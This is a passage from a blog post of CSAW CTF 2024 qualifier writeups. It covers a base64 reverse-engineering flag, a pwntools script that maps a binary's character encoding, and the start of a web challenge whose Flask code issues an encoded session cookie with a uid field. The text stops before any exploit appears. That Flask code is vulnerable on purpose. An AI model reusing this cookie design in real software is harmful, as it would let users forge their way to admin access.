@@ -1,0 +1,1119 @@
+---
+layout: post
+title: "CSAW CTF 2024 Quals - Writeups"
+description: "[write-up] Some challenges from CSAW CTF 2024"
+categories: "Writeups"
+---
+
+<style type="text/css">
+
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+ul {
+  list-style: none;
+}
+</style>
+
+<title>CSAW CTF 2024 Quals - LostMyPlaintext</title>
+<img class="center" src="/assets/images/csawBanner.png">
+<p>Writeups for some of the challenges from this years CSAW CTF.</p>
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>Categories:</h3></p>
+<ul>
+	<li><a href="#Reverse Engineering">Reverse Engineering</a></li>
+	<li><a href="#Web">Web</a></li>
+	<li><a href="#Cryptography">Cryptography</a></li>
+</ul>
+
+
+<p><a name="Reverse Engineering"></a></p>
+<p></p>
+<hr style="border-top:1px solid #28323C;">
+<p><h3>Reverse Engineering</h3></p>
+<p></p>
+
+<hr style="border-top:1px solid #28323C;">
+
+<p><h3>Baby Rev</h3></p>
+<p></p>
+<p></p>
+<img class="center" src="/assets/images/csaw24babyrev.png">
+<p>For this challenge we're given a single binary executable that takes in a string and seems to tell you if the provided string is the flag or not.</p>
+<p></p>
+<img class="center" src="/assets/images/csaw24babyrev2.png">
+<p></p>
+<p>First thing I do on every "baby" reverse engineering challenge is a sanity check: run the strings tool on the binary to make sure the challenge isn't as simple as finding the flag plainely writen in the midst of the binary file.</p>
+<p>The strings command produces, among other things, the following output:</p>
+<p></p>
+<img class="center" src="/assets/images/csaw24babyrev3.png">
+
+<p>Part of this seems strangely similar to base64 encoding, however, there is an extra "H" letter after the equal signs, which ruins the padding. Turns out, if you remove all the "H"s you see here and base64 decode the result you get the flag so I guess the lesson here is always run strings on baby rev challenges.
+A quick python script gets us our first flag for some easy points!</p>
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">base64</span>
+
+<span style="color: #f8f8f2">strangeString</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;&#39;Y3Nhd2N0H</span>
+<span style="color: #e6db74">ZntOM3YzH</span>
+<span style="color: #e6db74">cl9wcjA3H</span>
+<span style="color: #e6db74">M2M3X3MzH</span>
+<span style="color: #e6db74">bnMxNzF2H</span>
+<span style="color: #e6db74">M18xbmYwH</span>
+<span style="color: #e6db74">cm00NzEwH</span>
+<span style="color: #e6db74">bl91czFuH</span>
+<span style="color: #e6db74">Z19qdXM3H</span>
+<span style="color: #e6db74">XzNuYzBkH</span>
+<span style="color: #e6db74">MW5nIV8jH</span>
+<span style="color: #e6db74">M25jMGQxH</span>
+<span style="color: #e6db74">bmdfMXNfH</span>
+<span style="color: #e6db74">bjB0XzNuH</span>
+<span style="color: #e6db74">Y3J5cDcxH</span>
+<span style="color: #e6db74">MG4hfQ==H&#39;&#39;&#39;</span>
+
+<span style="color: #f8f8f2">flagb64</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;&quot;</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">line</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">strangeString</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">split(</span><span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">):</span>
+	<span style="color: #f8f8f2">flagb64</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">line[:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">b64decode(flagb64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode())</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode())</span>
+</pre></div>
+ <p></p>
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">Flag:</span> <span style="color: #e6db74">&quot;csawctf{N3v3r_pr073c7_s3ns171v3_1nf0rm4710n_us1ng_jus7_3nc0d1ng!_#3nc0d1ng_1s_n0t_3ncryp710n!}&quot;</span>
+</pre></div>
+
+<hr style="border-top:1px solid #28323C;">
+<p><h3>Magic Tricks</h3></p>
+<p></p>
+<p></p>
+<img class="center" src="/assets/images/csaw24magic1.png">
+<p>For the other reverse challenge I looked at we get an output file with some gibberish data, and a binary executalbe (surprise, surprise).</p>
+<img class="center" src="/assets/images/csaw24magic2.png">
+<p></p>
+<p>The executable asks for a a string and writes the result (usually gibberish) to an output file. First thing I did was to attempt a dynamic analysis approach to this, which (spoilers) ended up being enough to solve the challenge. I started by sending what we know is the begining of the flag multiple times.</p>
+<img class="center" src="/assets/images/csaw24magic3.png">
+<p>And got promising results</p>
+<img class="center" src="/assets/images/csaw24magic4.png">
+<p>Not only does it seem like there is a repeating pattern indicating that this is some sort of simple encoding where each character corresponds to a specific sequence of bytes but also this matches the begining of the output for the provided output file. From here I wrote a script to match the encoding output to it's respective letter and then used it to translate the contents of the original output file, gettting the flag.</p>
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">binascii</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">hexlify</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">pwn</span> <span style="color: #f92672">import</span> <span style="color: #f92672">*</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">time</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sleep</span>
+
+<span style="color: #f8f8f2">toSend</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[</span><span style="color: #ae81ff">\\</span><span style="color: #e6db74">]^_{|}~&quot;</span>
+<span style="color: #f8f8f2">dic</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{}</span>
+
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(len(toSend)):</span>
+	<span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">process(</span><span style="color: #e6db74">&quot;./chall&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;Enter data:&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">toSend[i])</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(toSend[i])</span>
+	<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">cur</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&quot;&quot;</span>
+	<span style="color: #66d9ef">with</span> <span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&quot;output.txt&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;rb&quot;</span><span style="color: #f8f8f2">)</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">file:</span>
+		<span style="color: #f8f8f2">cur</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hexlify(file</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">read())</span>
+		<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Result from program:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">cur)</span>
+	<span style="color: #f8f8f2">dic[cur</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode()]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">toSend[i]</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+
+
+<span style="color: #75715e"># First Attempt</span>
+<span style="color: #75715e">#originalOutput = [&#39;c2a8&#39;, &#39;c388&#39;, &#39;c2a2&#39;, &#39;c390&#39;, &#39;c2a8&#39;, &#39;c389&#39;, &#39;c2af&#39;, &#39;c398&#39;, &#39;c389&#39;, &#39;716a&#39;, &#39;c2a0&#39;, &#39;c387&#39;, &#39;c38a&#39;, &#39;c2bf&#39;, &#39;6a4a&#39;, &#39;c2a0&#39;, &#39;62c3&#39;, &#39;876a&#39;, &#39;c2a0&#39;, &#39;5071&#39;, &#39;48c2&#39;, &#39;a0c2&#39;, &#39;b848&#39;, &#39;c392&#39;, &#39;c2a0&#39;, &#39;50c2&#39;, &#39;80c2&#39;, &#39;a0c3&#39;, &#39;89c2&#39;, &#39;b148&#39;, &#39;c2a0&#39;, &#39;7041&#39;, &#39;c381&#39;, &#39;c2b1&#39;, &#39;48c3&#39;, &#39;874a&#39;, &#39;c2a0&#39;, &#39;c2ba&#39;, &#39;6252&#39;, &#39;4268&#39;, &#39;c39a&#39;]</span>
+
+<span style="color: #75715e">#for c in originalOutput:</span>
+<span style="color: #75715e">#	try:</span>
+<span style="color: #75715e">#		print(dic[c],end=&quot;&quot;)</span>
+<span style="color: #75715e">#	except:</span>
+<span style="color: #75715e">#		print(&quot;#&quot;,end=&quot;&quot;)</span>
+<span style="color: #75715e">#print(&quot;&quot;)</span>
+<span style="color: #75715e"># Output: csawctf#t#_run#_##_####y_#####_#ph##_m###</span>
+
+<span style="color: #f8f8f2">originalOutput</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a8&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;88&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;90&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a8&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;89&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;af&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;98&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;89&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;71&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;6a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;87&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;8a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;bf&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;6a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;4a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;62&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;87&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;6a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;50&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;71&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;48&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;b8&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;48&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;92&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;50&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;80&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;89&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;b1&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;48&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;70&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;41&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;81&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;b1&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;48&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;87&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;4a&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;a0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c2&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;ba&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;62&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;52&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;42&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;68&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;c3&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;9a&#39;</span><span style="color: #f8f8f2">]</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(len(originalOutput)):</span>
+	<span style="color: #66d9ef">try</span><span style="color: #f8f8f2">:</span>
+		<span style="color: #f8f8f2">curTry</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">originalOutput[i]</span>
+		<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">curTry</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">dic:</span>
+			<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(dic[curTry],end</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">)</span>
+		<span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+			<span style="color: #f8f8f2">curTry</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">originalOutput[i</span><span style="color: #f92672">+</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+			<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(dic[curTry],end</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">)</span>
+			<span style="color: #f8f8f2">i</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+	<span style="color: #66d9ef">except</span><span style="color: #f8f8f2">:</span>
+		<span style="color: #66d9ef">pass</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">)</span>
+</pre></div>
+<p></p>
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span> <span style="color: #e6db74">&quot;csawctf{tHE_runE5_ArE_7H3_k3y_7O_th3_G0ph3r5_mA91C}&quot;</span>
+</pre></div>
+
+
+
+<p><a name="Web"></a></p>
+<p></p>
+<hr style="border-top:1px solid #28323C;">
+<p><h3>Web</h3></p>
+<p></p>
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>Log Me In</h3></p>
+<p></p>
+<p></p>
+<img class="center" src="/assets/images/csaw24logme1.png">
+<p>In this challenge we are presentes with a simple web app that allows us to register a username and passowrd, log in and access a welcome page.</p>
+<img class="center" src="/assets/images/csaw24logme2.png">
+<p></p>
+<p>Looking at the source code, particularly the code for the "/user" endpoint we see that the message in the welcome page will display the flag if our user cookie satisfies the conditon uid == 0. From the "/login" endpoint we see that out account cookie will be an encoded version of something looking like "{'username':[OUR USERNMAE], 'displays':[OUR DISPLAY NAME], 'uid':1}" since the uid of each user is always set to 1 on "/register".</p> 
+<p></p>
+
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">flask</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">make_response,</span> <span style="color: #f8f8f2">session,</span> <span style="color: #f8f8f2">Blueprint,</span> <span style="color: #f8f8f2">request,</span> <span style="color: #f8f8f2">jsonify,</span> <span style="color: #f8f8f2">render_template,</span> <span style="color: #f8f8f2">redirect,</span> <span style="color: #f8f8f2">send_from_directory</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">pathlib</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">Path</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">hashlib</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sha256</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">utils</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">is_alphanumeric</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">models</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">Account,</span> <span style="color: #f8f8f2">db</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">utils</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">decode,</span> <span style="color: #f8f8f2">encode</span>
+
+<span style="color: #f8f8f2">flag</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">(Path(__file__)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">parent</span> <span style="color: #f92672">/</span> <span style="color: #e6db74">&quot;flag.txt&quot;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">read_text()</span>
+
+<span style="color: #f8f8f2">pagebp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Blueprint(</span><span style="color: #e6db74">&#39;pagebp&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">__name__)</span>
+
+<span style="color: #a6e22e">@pagebp.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;/&#39;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">index</span><span style="color: #f8f8f2">():</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">send_from_directory(</span><span style="color: #e6db74">&quot;static&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;index.html&#39;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #a6e22e">@pagebp.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;/login&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">methods</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;GET&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;POST&quot;</span><span style="color: #f8f8f2">])</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">login</span><span style="color: #f8f8f2">():</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">method</span> <span style="color: #f92672">!=</span> <span style="color: #e6db74">&#39;POST&#39;</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">send_from_directory(</span><span style="color: #e6db74">&#39;static&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;login.html&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">username</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">form</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;username&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">password</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sha256(request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">form</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;password&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">strip()</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode())</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">username</span> <span style="color: #f92672">or</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">password:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Missing Login Field&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">400</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">is_alphanumeric(username)</span> <span style="color: #f92672">or</span> <span style="color: #f8f8f2">len(username)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">50</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Username not Alphanumeric or longer than 50 chars&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">403</span>
+    <span style="color: #75715e"># check if the username already exists in the DB</span>
+    <span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Account</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">query</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">filter_by(username</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">username)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">first()</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">user</span> <span style="color: #f92672">or</span> <span style="color: #f8f8f2">user</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">password</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">password:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Login failed!&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">403</span>
+    <span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span>
+        <span style="color: #e6db74">&#39;username&#39;</span><span style="color: #f8f8f2">:user</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">username,</span>
+        <span style="color: #e6db74">&#39;displays&#39;</span><span style="color: #f8f8f2">:user</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">displayname,</span>
+        <span style="color: #e6db74">&#39;uid&#39;</span><span style="color: #f8f8f2">:user</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">uid</span>
+    <span style="color: #f8f8f2">}</span>
+    <span style="color: #f8f8f2">token</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">encode(dict(user))</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">token</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">None:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Error while logging in!&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">500</span>
+    <span style="color: #f8f8f2">response</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">make_response(jsonify({</span><span style="color: #e6db74">&#39;message&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&#39;Login successful&#39;</span><span style="color: #f8f8f2">}))</span>
+    <span style="color: #f8f8f2">response</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">set_cookie(</span><span style="color: #e6db74">&#39;info&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">token,</span> <span style="color: #f8f8f2">max_age</span><span style="color: #f92672">=</span><span style="color: #ae81ff">3600</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">httponly</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">True)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">response</span>
+
+<span style="color: #a6e22e">@pagebp.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;/register&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">methods</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[</span><span style="color: #e6db74">&#39;GET&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;POST&#39;</span><span style="color: #f8f8f2">])</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">register</span><span style="color: #f8f8f2">():</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">method</span> <span style="color: #f92672">!=</span> <span style="color: #e6db74">&#39;POST&#39;</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">send_from_directory(</span><span style="color: #e6db74">&#39;static&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;register.html&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">username</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">form</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;username&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">password</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sha256(request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">form</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;password&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">strip()</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode())</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>
